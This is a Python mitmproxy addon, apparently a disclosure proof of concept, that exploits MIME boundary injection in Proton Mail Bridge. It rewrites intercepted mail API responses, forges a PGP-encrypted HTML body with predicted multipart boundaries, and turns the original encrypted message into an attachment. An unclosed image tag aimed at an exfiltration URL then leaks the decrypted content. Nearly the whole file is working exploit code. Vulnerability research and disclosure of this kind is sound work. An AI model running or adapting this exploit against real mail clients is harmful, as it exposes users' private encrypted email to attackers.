"""MIME boundary-injection PoC against Proton Mail Bridge (mitmproxy addon).

Prerequisite: a Proton Bridge instance whose HTTPS traffic is routed
through mitmproxy, with the mitmproxy CA trusted by Bridge.

Run:
    mitmdump -s boundary-injection.py
"""

import json
import re
from hashlib import sha256

import requests
from mitmproxy import http
from pgpy import PGPKey, PGPMessage

EXFIL_URL = "http://localhost:8000/"

_FULL_MESSAGE_PATH = re.compile(r"^/mail/v4/messages/([^/]{32,})$")
_SYNTHETIC_ATTACHMENT_BYTES: dict[str, bytes] = {}

HTML_BODY = (
    "Body1\r\n--BOUND_2--\r\n--BOUND_1\r\n"
    "Content-Type: text/html\r\n"
    "Content-Transfer-Encoding: quoted-printable\r\n\r\n"
    f'<img src="{EXFIL_URL}'
)
ATTACHMENT2_BYTES = b'"/>'

def _bound(seed: str, boundid: int) -> str:
    for _ in range(boundid):
        seed = sha256(seed.encode()).hexdigest()
    return seed

def _multipart_attack_final_html(sid: str) -> str:
    return HTML_BODY.replace("BOUND_2", _bound(sid, 2)).replace("BOUND_1", _bound(sid, 1))

def _message_id_from_path(req: http.Request) -> str | None:
    m = _FULL_MESSAGE_PATH.match(req.path or "")
    return m.group(1) if m else None

def _fetch_pubkey_for_email(email: str) -> str:
    return requests.get("https://api.protonmail.ch/pks/lookup", params={"op": "get", "search": email}).text

def _encrypt(plaintext: str, armored_key: str) -> str:
    key, _ = PGPKey.from_blob(armored_key)
    pub = key if key.is_public else key.pubkey
    enc = pub.encrypt(PGPMessage.new(plaintext))
    return str(enc)

def _dearmor(armored_text: str) -> bytes:
    return bytes(PGPMessage.from_blob(armored_text))

# mitmproxy callback
def response(flow: http.HTTPFlow) -> None:
    if flow.request is None or flow.response is None:
        return
    req, resp = flow.request, flow.response
    path = req.path or ""

    if path.startswith("/mail/v4/attachments/"):
        aid = path.rsplit("/", 1)[-1]
        payload = _SYNTHETIC_ATTACHMENT_BYTES.get(aid)
        if payload is not None:
            resp.status_code = 200
            resp.content = payload
            resp.headers["content-type"] = "application/octet-stream"
            resp.headers["content-length"] = str(len(payload))
        return

    if req.method != "GET" or req.pretty_host != "mail-api.proton.me":
        return
    mid = _message_id_from_path(req)
    raw = resp.content if resp.content is not None else resp.raw_content
    if not mid or resp.status_code < 200 or resp.status_code >= 300 or not raw:
        return

    payload = json.loads(raw)
    msg = payload["Message"]
    mailbox_email = msg["Address"]["Email"] if "Address" in msg else msg["ToList"][0]["Address"]
    armored_key = _fetch_pubkey_for_email(mailbox_email)
    forged = _multipart_attack_final_html(mid)
    forged_armored = _encrypt(forged, armored_key)

    original_body = msg["Body"]
    data1 = _dearmor(original_body)
    data2 = _dearmor(_encrypt(ATTACHMENT2_BYTES, armored_key))
    att1, att2 = f"syn-{mid}-1", f"syn-{mid}-2"
    _SYNTHETIC_ATTACHMENT_BYTES[att1] = data1
    _SYNTHETIC_ATTACHMENT_BYTES[att2] = data2

    msg["Body"] = forged_armored
    msg["MIMEType"] = "text/html"
    msg["NumAttachments"] = 2
    msg["Attachments"] = [
        {"ID": att1, "Name": "att1", "MIMEType": "image/gif", "Disposition": "inline", "ContentID": "api-probe-cid1", "Size": len(data1)},
        {"ID": att2, "Name": "att2", "MIMEType": "message/rfc822", "Disposition": "inline", "ContentID": "api-probe-cid2", "Size": len(data2)},
    ]
    resp.text = json.dumps(payload)
    print(f"[boundary injection attack] mutated GET {path} html_len={len(forged)} armored_len={len(forged_armored)}", flush=True)
